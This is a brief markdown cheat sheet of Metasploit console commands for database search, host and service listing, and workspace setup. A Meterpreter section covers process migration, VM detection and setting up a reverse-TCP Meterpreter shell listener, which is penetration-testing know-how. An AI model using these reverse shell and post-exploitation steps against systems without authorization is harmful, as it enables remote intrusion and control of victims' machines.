# Metasploit Notes

### Basics

---

| Commmand                   | Description                         |
| -------------------------- | ----------------------------------- |
| `search <keyword>`         | Search metasploit's db for exploits |
| `get <var>`                | Get context-specific variable       |
| `setg <var>`               | Set global variable                 |
| `unset <var>`              | Unset context-specific variable     |
| `db_nmap <options> <host>` | store nmap scan in database         |
| `services`                 | list open services on target        |
| `hosts`                    | list host info in database          |
| `vulns`                    | list vulns                          |
| `edit`                     | edit exploit source code            |

### meterpreter (windows)

| Commmand | Description |
| --- | --- |
| `migrate <PID>` | migrate to another process |
| `run post/windows/gather/checkvm` | check if target is a VM |
| `use exploit/multi/handler` | setup msfvenom reverse shell payload listener, don't forget to set LHOST and LPORT |
| `set payload windows/meterpreter/reverse_tcp run` | setup windows meterpreter reverse shell |

### Project Management

| Commmand     | Description                |
| ------------ | -------------------------- |
| `msfdb init` | create metasploit database |
| `db_status`  | connect to db              |
| `workspace`  | setup workspace            |
